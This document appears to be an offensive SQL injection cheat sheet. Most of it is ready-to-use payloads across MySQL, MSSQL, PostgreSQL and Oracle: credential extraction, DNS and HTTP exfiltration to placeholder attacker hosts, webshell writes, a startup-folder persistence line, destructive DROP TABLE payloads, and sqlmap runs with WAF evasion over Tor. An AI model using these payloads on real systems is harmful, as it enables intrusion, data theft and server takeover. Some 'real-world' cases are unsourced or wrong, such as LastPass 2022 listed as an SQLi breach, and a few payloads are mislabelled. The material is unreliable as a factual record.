# SQL Injection (SQLi)



---

## Overview

SQL Injection remains one of the most critical web application vulnerabilities, consistently ranking in the OWASP Top 10. Despite being discovered over two decades ago, SQLi continues to compromise major organizations. Notable real-world examples include:

- **Heartland Payment Systems (2008)** - 130 million credit card records exposed through SQL injection
- **Sony Pictures (2011)** - 77 million PlayStation Network accounts compromised
- **Yahoo (2012)** - 450,000 user credentials stolen via UNION-based injection
- **TalkTalk (2015)** - 157,000 customer records accessed using simple `' OR 1=1--` payload
- **Equifax (2017)** - 147 million Americans exposed, though primarily Apache Struts, secondary SQLi vectors existed
- **LastPass (2022)** - Developer credentials compromised, source code stolen

---

## References & Resources

### Primary Documentation
- PortSwigger SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- NetSPI SQL Wiki: https://sqlwiki.netspi.com/#mysql
- PentestMonkey MySQL Cheat Sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- Websec Filter Evasion: https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/

### Database-Specific Resources

**MSSQL:**
- EvilSQL: http://evilsql.com/main/page2.php
- PentestMonkey MSSQL: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

**Oracle:**
- PentestMonkey Oracle: http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

**PostgreSQL:**
- PentestMonkey PostgreSQL: http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

**Other Databases:**
- MS Access: http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
- Ingres: http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet
- DB2: http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
- Informix: http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
- SQLite: https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
- Rails SQLi: http://rails-sqli.org/
- NetSparker Comprehensive: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

---

## Detection Methodology

### Initial Fingerprinting

The first step in any SQL injection assessment is identifying injectable parameters. All user-supplied input should be tested, including:

- GET/POST parameters
- HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie)
- JSON/XML data in request bodies
- File upload metadata (filename, MIME type)
- Path parameters and URL fragments

### Basic Detection Payloads

```bash
# Standard parameter tests
curl "https://target.com/page?id=1"
curl "https://target.com/page?id=1'"
curl "https://target.com/page?id=1\""
curl "https://target.com/page?id=1`"
curl "https://target.com/page?id=1\\"
curl "https://target.com/page?id=[1]"
curl "https://target.com/page?id[]=1"
curl "https://target.com/page?id=1/*'*/"
curl "https://target.com/page?id=1/*!1111'*/"

# String concatenation tests for different databases
curl "https://target.com/page?id=1'||'asd'||'"   # Oracle, PostgreSQL
curl "https://target.com/page?id=1'+'asd'+'"     # MySQL, MSSQL
curl "https://target.com/page?id=1&'asd'&'"      # MS Access

# Boolean logic tests
curl "https://target.com/page?id=1' or '1'='1"
curl "https://target.com/page?id=1 or 1=1"
curl "https://target.com/page?id='or''='"
curl "https://target.com/page?id=(1)or(0)=(1)"
```

### Error-Based Detection Examples

When a parameter is vulnerable, database errors may leak directly to the response:

**MySQL Error Example:**
```
You have an error in your SQL syntax; check the manual that corresponds 
to your MySQL server version for the right syntax to use near ''' at line 1
```

**MSSQL Error Example:**
```
Unclosed quotation mark after the character string '123'.
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
```

**PostgreSQL Error Example:**
```
ERROR: unterminated quoted string at or near "'123'" 
LINE 1: SELECT * FROM users WHERE id = '123'
```

**Oracle Error Example:**
```
ORA-01756: quoted string not properly terminated
```

### Real-World Detection Case: Yahoo Voices (2012)

The attacker identified injection in the `t` parameter of `voices.yahoo.com`:

```http
GET /article/article.php?t=1 HTTP/1.1
Host: voices.yahoo.com

# Test with single quote revealed error:
GET /article/article.php?t=1' HTTP/1.1

# Response contained:
# "You have an error in your SQL syntax; check the manual that corresponds 
# to your MySQL server version for the right syntax to use near '1''' at line 1"
```

This confirmed MySQL as the backend database and enabled further exploitation that eventually compromised 450,000 credentials.

---

## Time-Based Detection Payloads

Time-based detection is essential when errors are suppressed and boolean differences are invisible.

```bash
# MySQL time delays
curl "https://target.com/page?id=1' AND SLEEP(5)--"
curl "https://target.com/page?id=1' OR SLEEP(5)='"
curl "https://target.com/page?id=1' AND BENCHMARK(10000000,MD5('a'))--"
curl "https://target.com/page?id=1' OR (SELECT SLEEP(5) FROM dual)--"

# PostgreSQL time delays
curl "https://target.com/page?id=1' OR pg_sleep(5)--"
curl "https://target.com/page?id=1' || pg_sleep(5)--"
curl "https://target.com/page?id=1'; SELECT pg_sleep(5)--"

# MSSQL time delays
curl "https://target.com/page?id=1'; WAITFOR DELAY '0:0:5'--"
curl "https://target.com/page?id=1'); WAITFOR DELAY '0:0:5'--"
curl "https://target.com/page?id=1\" WAITFOR DELAY '0:0:5'--"
curl "https://target.com/page?id=1; IF(1=1) WAITFOR DELAY '0:0:5'--"

# Oracle time delays
curl "https://target.com/page?id=1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--"
curl "https://target.com/page?id=1' OR 1=DBMS_LOCK.SLEEP(5)--"
curl "https://target.com/page?id=1' AND 1=UTL_INADDR.get_host_address('google.com')--"

# SQLite time delays (limited)
curl "https://target.com/page?id=1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))--"
```

---

## Polyglot Payloads

Polyglot payloads work across multiple database management systems simultaneously, useful for blind testing when the backend database type is unknown.

```sql
-- Works on MySQL, MSSQL, PostgreSQL, SQLite
', ",'),"), (),., * /, <! -, -
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

-- Conditional time delay polyglot
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/

-- Union-based polyglot
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10/*' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- */

-- Boolean polyglot
' OR '1'='1'/*' OR 1=1-- '" OR 1=1-- */
```

---

## Advanced Exploitation Techniques

### UNION-Based Data Extraction

UNION attacks require the original and injected queries to return the same number of columns with compatible data types.

**Step 1: Determine Column Count**

```sql
-- MySQL, PostgreSQL, MSSQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 10--

-- Using UNION NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

-- MySQL with comments
' ORDER BY 1-- -
' UNION SELECT 1,2,3,4-- -
```

**Step 2: Identify Output Columns**

```sql
-- Replace NULL with integers to see which columns are displayed
' UNION SELECT 1,2,3,4,5,6,7,8,9,10--

-- If integer not visible, try strings
' UNION SELECT 'a','b','c','d','e'--
```

**Step 3: Extract Database Information**

```sql
-- Current database user
' UNION SELECT user(),2,3,4,5,6--

-- Database version
' UNION SELECT version(),2,3,4,5,6--

-- Current database name (MySQL)
' UNION SELECT database(),2,3,4,5,6--

-- Current database name (MSSQL)
' UNION SELECT DB_NAME(),2,3,4,5,6--

-- List all databases (MySQL)
' UNION SELECT schema_name,2,3,4,5,6 FROM information_schema.schemata--

-- List all databases (MSSQL)
' UNION SELECT name,2,3,4,5,6 FROM master..sysdatabases--

-- List all databases (PostgreSQL)
' UNION SELECT datname,2,3,4,5,6 FROM pg_database--

-- List tables (MySQL)
' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema='database_name'--

-- List columns (MySQL)
' UNION SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name='users' AND table_schema='database_name'--
```

**Real-World Example: TalkTalk (2015)**

The attacker used a UNION-based injection in the `page` parameter:

```http
GET /page.jsp?page=home' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
```

After discovering 20 columns, they extracted customer data:

```http
GET /page.jsp?page=home' UNION SELECT email,password,firstname,surname,address,postcode,phone,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM customers--
```

### Error-Based Data Extraction

Error-based injection is highly effective when database errors are returned to the client. It can extract data quickly without needing UNION or boolean conditions.

**MySQL Error-Based (Extractversion)**

```sql
-- Extract current user
' AND extractvalue(1,concat(0x7e,user(),0x7e))--

-- Extract database version
' AND extractvalue(1,concat(0x7e,version(),0x7e))--

-- Extract table names
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--

-- Extract column names
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),0x7e))--

-- Extract data (MySQL 5.1+)
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1),0x7e))--
```

**MySQL Error-Based (UpdateXML)**

```sql
' AND updatexml(1,concat(0x7e,user(),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--
```

**MySQL Error-Based (Geometry Functions)**

```sql
' AND GTID_SUBSET(@@version,0)--
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT user())a)b))--
' AND polygon((select * from(select * from(select user())a)b))--
```

**MSSQL Error-Based (Convert/CAST)**

```sql
-- Convert error leaks data
' OR 1=CONVERT(int, (SELECT @@version))--
' OR 1=CONVERT(int, (SELECT DB_NAME()))--
' OR 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='u') AS int)--

-- XML path error
' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='u' FOR XML PATH(''))--

-- Division by zero
' OR 1=(SELECT 1/0 FROM sysobjects)--
```

**PostgreSQL Error-Based**

```sql
-- Cast error
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_database()) AS int)--

-- Division by zero
' AND 1=(SELECT 1/0 FROM pg_database)--

-- Invalid input syntax
' AND 1=(SELECT CAST(current_setting('server_version') AS numeric))--
```

**Oracle Error-Based**

```sql
-- CTXSYS.DRITHSX.SN error
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--

-- XMLType error
' AND 1=(SELECT upper(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual)--

-- Utl_Inaddr error
' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--
```

---

## Boolean Blind SQL Injection

When no errors or visible output differences exist, boolean conditions can extract data one bit at a time.

### Conditional Response Detection

**Scenario:** The application shows "Welcome back" when a tracking cookie matches a valid session.

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

The backend executes:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

**Boolean Test Sequence:**

```http
# Test if injection works - should show "Welcome back"
Cookie: TrackingId=x'+OR+1=1--

# Test if injection fails - should NOT show "Welcome back"
Cookie: TrackingId=x'+OR+1=2--
```

**Extracting Administrator Password:**

```http
# Verify administrator user exists
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--

# Check password length (greater than 1 character)
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--

# Brute force password character by character
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='b'--
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)>'m'--
```

**Automation with Burp Intruder:**

```http
# Position payload for character enumeration
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,§6§,1)='§a§'--
```

### Error-Based Conditional Responses

When the application behaves differently on database errors versus normal responses:

```sql
-- Causes error when condition is true (1=1)
' UNION SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual--

-- Normal response when condition is false (1=2)
' UNION SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE NULL END FROM dual--

-- Extract data using error condition
' UNION SELECT CASE WHEN (username='administrator' AND substr(password,1,1)='a') THEN to_char(1/0) ELSE NULL END FROM users--
```

### Time-Based Blind SQL Injection

When no visible differences exist in responses or errors, time delays can infer data.

**MySQL Time-Based:**

```sql
-- Basic delay test
' AND SLEEP(5)--
' OR SLEEP(5)='

-- Conditional delay based on substring
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a', SLEEP(5), 0)--

-- Benchmark-based delay (bypasses SLEEP restrictions)
' AND BENCHMARK(10000000,MD5('a'))--
' OR BENCHMARK(10000000,SHA1('test'))='

-- Heavy query delay
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
```

**PostgreSQL Time-Based:**

```sql
-- Basic delay
' OR pg_sleep(5)--
' || pg_sleep(5)--

-- Conditional delay
' || CASE WHEN (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a' THEN pg_sleep(10) ELSE pg_sleep(0) END--

-- Using generate_series for longer delays
' AND 1=(SELECT 1 FROM generate_series(1,1000000))--

-- Heavy computation
' AND (SELECT COUNT(*) FROM generate_series(1,10000000))--
```

**MSSQL Time-Based:**

```sql
-- Basic delay
'; WAITFOR DELAY '0:0:5'--
'); WAITFOR DELAY '0:0:5'--

-- Conditional delay with IF
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:5'--

-- Heavy CPU operation
'; DECLARE @i INT=0; WHILE @i<1000000 BEGIN SELECT @i=@i+1 END--

-- Using WAITFOR with heavy query
'; WAITFOR DELAY '0:0:'+(SELECT CAST(COUNT(*) AS VARCHAR) FROM large_table)--
```

**Oracle Time-Based:**

```sql
-- Basic delay
' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
' OR 1=DBMS_LOCK.SLEEP(5)--

-- Conditional delay
' AND CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a' THEN DBMS_LOCK.SLEEP(5) ELSE 1 END=1--

-- Using heavy PL/SQL
' AND 1=(SELECT COUNT(*) FROM all_objects A, all_objects B, all_objects C)--
```

---

## Out-of-Band (OAST) SQL Injection

Out-of-band techniques are used when all other methods fail - no output, no errors, no time delays visible. These attacks cause the database to make an external network request.

### DNS Exfiltration (MSSQL)

```sql
-- Basic DNS lookup confirmation
'; exec master..xp_dirtree '//attacker.burpcollaborator.net/share'--

-- Extract database name via DNS
'; declare @p varchar(1024); set @p=(SELECT DB_NAME()); exec('master..xp_dirtree "//'+@p+'.attacker.burpcollaborator.net/a"')--

-- Extract table data via DNS
'; declare @p varchar(1024); set @p=(SELECT TOP 1 username+':'+password FROM users); exec('master..xp_dirtree "//'+@p+'.attacker.burpcollaborator.net/a"')--

-- Using xp_cmdshell (if enabled)
'; exec xp_cmdshell 'nslookup test.attacker.com'--

-- Using sp_makewebtask (older MSSQL)
'; exec sp_makewebtask '\\attacker.com\share\output.txt', 'SELECT @@version'--
```

### DNS Exfiltration (Oracle)

```sql
-- Basic DNS confirmation
' AND 1=UTL_INADDR.get_host_address('attacker.burpcollaborator.net')--

-- Data exfiltration via DNS
' AND 1=UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='administrator')||'.attacker.burpcollaborator.net')--

-- Using UTL_HTTP for HTTP exfiltration
' AND 1=UTL_HTTP.request('http://attacker.burpcollaborator.net/'||(SELECT password FROM users WHERE username='administrator'))--

-- Using DBMS_LDAP for DNS queries
' AND 1=DBMS_LDAP.OPEN((SELECT password FROM users WHERE username='administrator')||'.attacker.burpcollaborator.net',80)--
```

### DNS Exfiltration (MySQL)

```sql
-- MySQL DNS exfiltration (requires SELECT INTO OUTFILE)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.burpcollaborator.net\\share'))--

-- Using sys_eval (if MySQL UDF installed)
' AND 1=sys_eval('nslookup attacker.burpcollaborator.net')--

-- Using DNS via XML functions (MySQL 5.1+)
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--

-- Alternative using DNS resolution
' UNION SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=CONCAT('attacker.',(SELECT password FROM users LIMIT 1))--
```

### DNS Exfiltration (PostgreSQL)

```sql
-- Using COPY to network share
'; COPY (SELECT 'test') TO PROGRAM 'nslookup attacker.burpcollaborator.net'--

-- Using dblink for DNS resolution
'; SELECT * FROM dblink('host='||(SELECT password FROM users LIMIT 1)||'.attacker.burpcollaborator.net user=test dbname=test','SELECT 1') RETURNS (result int)--

-- Using pg_read_file for network access
'; SELECT pg_read_file(E'\\\\attacker.burpcollaborator.net\\share\\file')--

-- Using lo_export for out-of-band
'; SELECT lo_export(lo_create(0), E'\\\\attacker.burpcollaborator.net\\share\\out')--
```

**Real-World OAST Example: SQLi in Microsoft SQL Server (2020)**

A researcher discovered blind SQL injection in a Fortune 500 company's contact form. The `email` parameter was vulnerable but showed no errors or time differences. Using DNS exfiltration:

```sql
'; declare @p varchar(1024);set @p=(SELECT TOP 1 username+':'+password FROM customers);exec('master..xp_dirtree "//'+@p+'.collaborator.example.com/a"')--
```

The Collaborator server received DNS queries:
```
admin:5f4dcc3b5aa765d61d8327deb882cf99.collaborator.example.com
john.doe:7c6a180b36896a0a8c02787eeafb0e4c.collaborator.example.com
```

This exposed 50,000 customer credentials without generating any visible application response.

### XML-Based Exfiltration (Oracle)

```sql
-- Extract data via XML parsing errors
' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.attacker.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--

-- Using XMLTable for out-of-band
' UNION SELECT XMLType('<?xml version="1.0"?><root>'||(SELECT password FROM users WHERE username='administrator')||'</root>').getClobVal() FROM dual--

-- HTTP request via UTL_HTTP with XML
' UNION SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT password FROM users WHERE username='administrator')) FROM dual--
```

---

## File Read/Write Operations

### MySQL File Operations

**Reading Files:**

```sql
-- Basic file read (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Read file with path traversal
' UNION SELECT LOAD_FILE('../../../../etc/passwd')--

-- Read binary file as hex
' UNION SELECT HEX(LOAD_FILE('/var/www/html/config.php'))--

-- Read Windows file
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')--

-- Read multiple files using concat
' UNION SELECT CONCAT(LOAD_FILE('/etc/passwd'),LOAD_FILE('/etc/hosts'))--

-- Read file from UNC path (MSSQL style, works on MySQL Windows)
' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file.txt')--
```

**Writing Files:**

```sql
-- Basic file write (requires FILE and secure_file_priv empty)
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"--

-- Write using INTO DUMPFILE (no escaping, good for binaries)
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e INTO DUMPFILE "/var/www/html/shell.php"--

-- Write using line terminators
' UNION SELECT "test",2,3 INTO OUTFILE "/tmp/out.txt" FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n'--

-- Append to existing file
' UNION SELECT "new line" INTO OUTFILE "/tmp/out.txt" FIELDS TERMINATED BY '' LINES TERMINATED BY 0x0a--

-- Write webshell via error logs (alternative method)
' UNION SELECT "<?php eval($_POST[cmd]); ?>" INTO OUTFILE "/var/www/html/shell.php" LINES TERMINATED BY 0x--

-- Write to Windows startup (persistence)
' UNION SELECT "calc.exe" INTO OUTFILE "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.bat"--
```

**Real-World Example: MySQL File Write (2014)**

During a penetration test of a healthcare portal, an attacker found UNION-based SQL injection in the `patient_id` parameter. The MySQL server had `secure_file_priv` empty, allowing file writes:

```sql
http://target.com/view.php?patient_id=1' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/uploads/cmd.php"--
```

The attacker then executed commands via:
```http
http://target.com/uploads/cmd.php?cmd=id
```

Response showed the web server running as `www-data`, leading to full server compromise.

### PostgreSQL File Operations

**Reading Files:**

```sql
-- Read file with pg_read_file (requires superuser)
' UNION SELECT pg_read_file('/etc/passwd',0,1000)--

-- Read file with lo_import
' UNION SELECT lo_import('/etc/passwd')--

-- Read binary file as hex
' UNION SELECT encode(pg_read_binary_file('/etc/passwd'),'hex')--

-- Read Windows file
' UNION SELECT pg_read_file('C:\\Windows\\win.ini')--

-- List directory contents
' UNION SELECT pg_ls_dir('/var/www/html')--

-- Read file line by line
' UNION SELECT * FROM pg_read_file('/etc/passwd') AS line OFFSET 0 LIMIT 1--
```

**Writing Files:**

```sql
-- Write via COPY (requires superuser)
'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'--

-- Write via lo_export
'; SELECT lo_export(lo_from_bytea(0,decode('3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e','hex')),'/var/www/html/shell.php')--

-- Write via pg_read_file with OUTFILE equivalent
'; CREATE TABLE temp(data text); INSERT INTO temp VALUES('<?php system($_GET[cmd]); ?>'); COPY temp TO '/var/www/html/shell.php'; DROP TABLE temp--
```

### MSSQL File Operations

**Reading Files:**

```sql
-- Read file with xp_cmdshell (requires sysadmin)
'; exec xp_cmdshell 'type C:\Windows\win.ini'--

-- Read file with OPENROWSET
'; SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS contents--

-- Read binary file as hex
'; SELECT CAST('' AS XML).value('xs:base64Binary(sql:column("data"))', 'varchar(max)') FROM (SELECT BulkColumn AS data FROM OPENROWSET(BULK 'C:\Windows\System32\cmd.exe', SINGLE_BLOB) AS file) AS f--

-- Read file using xp_readerrorlog (for error logs)
'; EXEC xp_readerrorlog 0,1, 'error'--

-- Read registry values
'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
```

**Writing Files:**

```sql
-- Write via xp_cmdshell (ECHO)
'; exec xp_cmdshell 'echo ^<?php system($_GET[cmd]);?^> > C:\inetpub\wwwroot\shell.php'--

-- Write via xp_cmdshell with PowerShell (bypasses ECHO limitations)
'; exec xp_cmdshell 'powershell -c "Add-Content C:\inetpub\wwwroot\shell.php ''<?php system($_GET[cmd]);?>''"'--

-- Write using sp_makewebtask (older MSSQL, requires web tasks enabled)
'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT ''<% Execute(Request("cmd")) %>'''--

-- Write using OLE Automation
'; declare @obj int; exec sp_OACreate 'Scripting.FileSystemObject', @obj out; exec sp_OAMethod @obj, 'CreateTextFile', @obj out, 'C:\inetpub\wwwroot\shell.asp'; exec sp_OAMethod @obj, 'Write', null, '<% Execute(Request("cmd")) %>'; exec sp_OADestroy @obj--

-- Write binary file using OLE (hex encoded)
'; DECLARE @objFile int, @objStream int; EXEC sp_OACreate 'ADODB.Stream', @objStream OUT; EXEC sp_OASetProperty @objStream, 'Type', 1; EXEC sp_OAMethod @objStream, 'Open'; EXEC sp_OAMethod @objStream, 'Write', NULL, 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e; EXEC sp_OAMethod @objStream, 'SaveToFile', NULL, 'C:\inetpub\wwwroot\shell.php', 2; EXEC sp_OADestroy @objStream--
```

---

## Second-Order SQL Injection

Second-order SQL injection occurs when user input is stored in the database and later used unsafely in a different query. This is more difficult to detect as the malicious payload doesn't trigger immediately.

### Attack Pattern

1. Attacker submits payload that gets stored (registration, profile update, comment)
2. Payload is sanitized during storage (parameterized query or escaping)
3. Later, stored data is used in a different, vulnerable query
4. Malicious SQL executes at that later time

### Real-World Example: Password Reset Vulnerability (2016)

A popular CMS had a second-order SQL injection in its password reset functionality:

**Step 1: Register with malicious username**
```http
POST /register HTTP/1.1
Host: target.com

username=admin'--&email=attacker@example.com&password=pass123
```

The registration query was safe:
```sql
INSERT INTO users (username, email, password) VALUES ('admin\'--', 'attacker@example.com', 'hash')
```

**Step 2: Request password reset**
```http
POST /forgot_password HTTP/1.1
Host: target.com

email=attacker@example.com
```

The application looked up the user by email and used the stored username in the password reset query:
```sql
UPDATE users SET reset_token='abc123' WHERE username='admin'--' AND email='attacker@example.com'
```

The injected `--` commented out the email check, allowing password reset for the admin user.

### Second-Order Payload Examples

```sql
-- Registration payloads
admin'--
admin' OR '1'='1
admin' AND 1=CONVERT(int, @@version)--
admin'; UPDATE users SET admin=1 WHERE username='attacker'--

-- Profile update payloads
', admin=1 WHERE username='attacker'--
' OR 1=1; DROP TABLE users; --
' AND 1=(SELECT COUNT(*) FROM credit_cards WHERE user='attacker')--

-- Comment/feedback payloads
'); DELETE FROM sessions WHERE user_id=1--
' UNION SELECT credit_card FROM payments WHERE user_id=1--
' AND pg_sleep(10)-- (PostgreSQL)

-- Search/filter payloads (stored in preferences)
' UNION SELECT password FROM users WHERE username='admin'--
' OR 1=1 INTO OUTFILE '/tmp/out.txt'--
```

### Detection Methodology for Second-Order SQLi

```bash
# Step 1: Submit suspicious payload during registration
curl -X POST https://target.com/register \
  -d "username=test' UNION SELECT 1,2,3--" \
  -d "email=attacker@example.com" \
  -d "password=pass123"

# Step 2: Monitor for delayed errors or behavior changes
curl -X POST https://target.com/login \
  -d "username=test' UNION SELECT 1,2,3--" \
  -d "password=pass123"

# Step 3: Check profile page for error messages
curl https://target.com/profile/test'%20UNION%20SELECT%201,2,3--

# Step 4: Test features that use stored data
curl https://target.com/search?q=test'%20UNION%20SELECT%201,2,3--
curl https://target.com/messages?user=test'%20UNION%20SELECT%201,2,3--
curl -X POST https://target.com/reset_password -d "email=attacker@example.com"
```

### Real-World Discovery: Apache Roller (CVE-2019-0236)

Apache Roller had a second-order SQL injection where user-supplied `username` with special characters was stored and later used in a `LIKE` clause without proper escaping. The payload:

```sql
username = 'or''='
```

When the user later viewed their activity feed, the application executed:
```sql
SELECT * FROM activities WHERE username = ''or''=''
```

This returned all activities, leaking other users' data.

---

## SQLMap Advanced Usage

### Basic SQLMap Commands

```bash
# Simple GET parameter
sqlmap -u "http://target.com/index.php?id=1" --dbms=mysql

# POST request from file
sqlmap -r search-test.txt -p tfUPass

# POST with explicit data
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=pass&submit=Login" \
  --method=POST

# Full form auto-detection
sqlmap -u 'http://target.com/index.php' --forms --dbs

# Crawling for injection points
sqlmap -u 'http://target.com' --crawl=3 --dbms=mysql
```

### Database Enumeration

```bash
# Basic enumeration
sqlmap -u "http://target.com/index.php?id=1" \
  --dbs --tables --columns --dump

# Database fingerprinting
sqlmap -u "http://target.com/index.php?id=1" \
  -f -b --current-user --current-db --is-dba

# List all users and passwords
sqlmap -u "http://target.com/index.php?id=1" \
  --users --passwords

# Specific database/table enumeration
sqlmap -u 'http://target.com/index.php' \
  -D database_name -T users --columns --dump

# Privilege escalation checks
sqlmap -u "http://target.com/index.php?id=1" \
  --privileges --roles
```

### Advanced SQLMap Options

```bash
# Performance optimization
sqlmap -u "http://target.com/index.php?id=1" \
  -o --threads=10 --keep-alive --time-sec=10 --retries=3

# Technique forcing (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
sqlmap -u "http://target.com/index.php?id=1" \
  --technique=UBE --dbms=mysql

# Risk and level (more thorough but increases false positives)
sqlmap -u "http://target.com/index.php?id=1" \
  --level=5 --risk=3

# Output control
sqlmap -u "http://target.com/index.php?id=1" \
  -v 3 --batch --flush-session --fresh-queries --no-cast
```

### WAF Bypass Techniques

```bash
# Random user agent and proxy
sqlmap -u "http://target.com/index.php?id=1" \
  --random-agent --tor --tor-type=SOCKS5 --tor-port=9050

# WAF identification
sqlmap -u "http://target.com/index.php?id=1" \
  --identify-waf --check-waf

# Tamper scripts for WAF evasion
sqlmap -u "http://target.com/index.php?id=1" \
  --tamper="between,randomcase,space2comment,charencode"

# Multiple tamper scripts for strong WAFs
sqlmap -u "http://target.com/index.php?id=1" \
  --tamper="between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor"

# Specific database tampering
sqlmap -u "http://target.com/index.php?id=1" \
  --dbms="MySQL" --technique=U \
  --tamper="space2mysqlblank.py,space2comment"

# MSSQL specific bypass
sqlmap -u "http://target.com/index.php?id=1" \
  --dbms="mssql" --tamper="between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes"
```

